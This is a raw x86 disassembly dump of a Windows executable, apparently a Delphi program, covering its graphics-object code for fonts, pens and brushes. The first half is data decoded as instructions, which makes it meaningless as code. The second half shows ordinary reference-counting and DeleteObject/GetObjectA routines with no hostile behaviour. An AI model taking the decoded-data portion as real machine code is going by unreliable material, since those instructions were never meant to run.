bound ebp [ ebp + 0x7 ]
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3e300040 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ esi + edi + 0x41 ] bl
add [ eax ] bl
add [ eax ] al
add ah dh
adc al 0x41
inc ecx
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
hlt
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
add [ eax ] al
or [ ebp + 0x200041 ] dh
add [ eax ] al
add [ eax ] eax
std
imul esp [ ebx + 0x73 ] 0xffff0001
nop
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax - 0x4c ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc ecx
outsb
je r-xdata
mov [ ecx ] 0xf
push esp
inc edi
jb r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
imul esp [ ebx + 0x73 ] 0xb3f4c08b
dec ebp
jb r-xdata
add [ ebx ] al
outsb
inc [ eax ]
0x41
mov esp 0x41b5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4dffbe4b ] ch
mov ch 0x41
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + edi * 4 - 0x4c ] si
inc ecx
add [ eax + 0x15 ] ch
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
mov ah 0x41
mov eax 0x41b4
add ah cl
mov ah 0x41
insb
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ eax + eax ] ah
add [ eax ] al
insb
mov dl 0xb5
inc ecx
jo r-xdata
dec eax
jo r-xdata
mov ah 0x41
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
imul esp [ ebx + 0x73 ] 0xc08b0000
or al 0xb5
inc ecx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
popad
add [ eax ] al
imul esp [ ebx + 0x73 ] 0x41b4b890
inc eax
add [ eax + esi - 0x3627ffc0 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ edx + ecx * 8 ] bl
inc ecx
imul sp [ ebp + 0x72 ] 0x1114
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] cl
mov ch 0x41
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
jo r-xdata
sub_41b544
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
mov ch 0x41
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
stosb [ edi ]
mov ch 0x41
add [ edx + 0x240041b5 ] dh
add [ eax ] al
add [ esp + esi * 4 + 0x41 ] ch
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x3627ffc0 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ edx + ecx * 8 ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] cl
mov ch 0x41
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
inc [ eax ]
0x41
sub_41b65b
mov cl 0x41
add [ eax - 0x32 ] dl
inc ecx
add [ eax - 0x32 ] bl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
fmul st5
inc ecx
add al bh
int 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
sbb dh cl
inc ecx
add [ esi + ecx * 8 ] ah
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
or [ edi + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edi + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xb7
inc ecx
add [ eax + eax ] bl
add [ eax ] al
insb
mov ah 0x41
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x310bffc0 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ edi + ecx * 8 ] bl
inc ecx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
and [ edi + 0x4070041 ] dh
push esp
push eax
outsb
or [ edi - 0x4b23ffbf ] dh
inc ecx
add [ eax + eax ] al
dec eax
rol [ ecx ] 0x1
push eax
rol [ ecx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
imul esp [ ebx + 0x73 ] 0xb1180004
inc ecx
add [ eax + edx * 8 ] bh
inc ecx
add [ eax + edx * 8 + 0x41 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
jae r-xdata
add eax [ eax ]
add eax 0x74646957
push 0xb808c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xb8
inc ecx
add [ eax ] bl
add [ eax ] al
add [ esp + esi * 4 + 0x41 ] ch
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x2e43ffc0 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add ah ah
rol [ ecx ] 0x1
push es
push esp
inc edx
jb r-xdata
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax - 0x2f ] cl
inc ecx
add [ eax - 0x2f ] dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
mov bl 0x41
add [ eax ] bl
add [ eax ] al
inc [ ecx + edx * 8 ]
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 - 0x339a9b91 ] al
mov dl 0x41
add [ eax ] bl
rol [ ecx ] 0x1
and cl dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
mov eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
and [ eax + 0x6070041 ] bh
push esp
inc edx
jb r-xdata
add [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add ah ah
mov eax 0x580041
jae r-xdata
or [ eax - 0x4b23ffbf ] bh
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
in al 0xb8
inc ecx
add [ eax ] bl
imul esp [ ebx + 0x73 ] 0xb1180002
inc ecx
add [ ebx + edx * 8 ] bl
inc ecx
add [ ebx + edx * 8 ] ah
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
mov bl 0x41
add [ eax ] bh
aam 0x41
add [ eax - 0x2c ] al
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
int3
sub_41ba9a
inc ecx
add [ edx + esi * 8 + 0x41 ] dh
add ah bh
inc ecx
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx ] al
add ch bh
dec eax
inc ecx
add [ eax ] cl
push esp
inc edi
jb r-xdata
inc eax
add [ ebx + esi ] dh
jo r-xdata
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x8afffc0 ] ah
inc ecx
add [ edi + esi * 8 + 0x540c0041 ] ch
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
clc
mov ebx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x44 ] ch
inc ecx
add [ eax + eax ] bh
add [ eax ] al
add al 0xba
inc ecx
add [ eax ] ah
xor eax [ eax ]
add [ eax + 0x41 ] al
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x23c0040 ] ah
inc edx
add [ eax + 0x3f ] al
inc ecx
add al bl
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
imul esp [ ebx - 0x73 ] 0xbacc0040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ebx 0x740041
inc eax
add [ ecx + ebp ] ch
inc eax
add [ esp + edx * 2 ] cl
push ebx
push 0x64657261
dec ecx
or al 0x54
imul esp [ ebx + 0x50 ] 0x680041ba
push ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
cwde
mov ebx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
in al dx
mov edx 0x33200041
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 + 0x740041 ] bl
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
imul esp [ ebx + 0x73 ] 0x38900000
mov ebx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xbb
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
sub_41bbfe
inc ecx
add [ eax + 0x2 ] bh
inc edx
add [ eax + 0x4c004140 ] dl
add al 0x42
add ah cl
add al 0x42
add [ ecx + esi * 8 ] ah
inc ecx
add [ eax + 0x34004207 ] al
or [ edx ] al
je r-xdata
inc edx
add [ esp + ecx + 0x14b80042 ] bh
inc edx
add [ ebp + edx - 0xca7ffbe ] cl
inc ecx
add [ eax + 0x16 ] ah
inc edx
add [ esi + edx + 0x1d40042 ] dh
inc edx
add [ edx + esi * 8 + 0x41 ] dh
add ah bh
inc ecx
add [ eax + 0x7400420b ] bl
sbb [ edx ] eax
adc al 0xb
inc edx
add [ eax - 0xe ] dh
inc ecx
add al dl
or [ edx ] al
mov esp 0xb800420c
adc al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 4 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x340041bd ]
add [ eax ] al
add [ edx + edi * 4 ] al
inc ecx
add [ eax ] ah
xor eax [ eax ]
add [ eax + 0x41 ] al
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x1ab80040 ] ah
inc edx
add [ eax + 0x3f ] al
inc ecx
add al bl
imul esp [ ebx + 0x73 ] 0xc08b0000
loopne r-xdata
inc edx
add [ ecx + ebx + 0x42 ] bh
add ah ah
pop es
inc edx
add [ eax + ecx + 0x42 ] al
add [ eax + 0x7004213 ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41bc7470
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41bbf870
add al cl
mov edx 0x41
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
add [ ebx + ecx ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
mov esp 0x180041
add [ eax ] al
in al dx
mov edx 0x33200041
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x1a1c0040 ] ah
inc edx
add [ edx + ebx + 0x42 ] cl
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
popad
nop
cmp al 0xbd
inc ecx
add [ eax ] al
sub_41bddc
sub [ esi + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi + 0x240041 ] bh
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x4173ffc0 ] ah
inc ecx
add [ eax ] dl
push esp
push edx
jae r-xdata
lahf
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41be50
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41be8c
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41bec8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41be3c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41beb0
xor edx edx
push ebp
push sub_41bf9c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfa3
mov eax [ ebp - 0x4 ]
call sub_41bebc
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407a3c
test al al
je r-xdata
sub_41bfac
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41beb0
xor ecx ecx
push ebp
push sub_41c033
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bebc
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41c05c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41beb0
xor eax eax
push ebp
push sub_41c0c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bec8
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41bfac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c0cc
mov eax [ ebp - 0x4 ]
call sub_41bebc
retn
mov eax ebx
mov si 0xfffd
call sub_4032ec
sub_41c0d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41beb0
xor eax eax
push ebp
push sub_41c130
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c137
mov eax [ ebp - 0x4 ]
call sub_41bebc
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_4032ec
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41bfac
sub_41c140
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41beb0
xor edx edx
push ebp
push sub_41c19f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1a6
mov eax [ ebp - 0x4 ]
call sub_41bebc
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41c1ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c249
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413860
mov ebx eax
mov eax ebx
call sub_41d778
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41dafc
mov eax [ rw-data ]
call sub_41c140
mov eax [ rw-data ]
call sub_41c140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c250
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_413860
call sub_41d9d4
inc esi
dec ebx
jne r-xdata
sub_41c89f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413310
retn
sub_41c8d0
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c04
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_4029f4
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41c984
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41bec8
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_41c9d8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41bfac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_41ca1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413e5c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c6dc
xor eax eax
push ebp
push sub_41cad7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c6dc
xor eax eax
push ebp
push sub_41caba
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c0d4
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cb58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cac1
mov eax [ ebp - 0x8 ]
call sub_41c6ec
retn
mov eax ebx
call sub_41cddc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41cdf8
sub_41cb08
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c6dc
xor eax eax
push ebp
push sub_41cb4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c05c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb54
mov eax [ ebp - 0x4 ]
call sub_41c6ec
retn
sub_41cb6c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41ccf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ccfc
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403ed0
retn
mov eax [ rw-data ]
call sub_41beb0
xor eax eax
push ebp
push sub_41cccd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41bebc
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
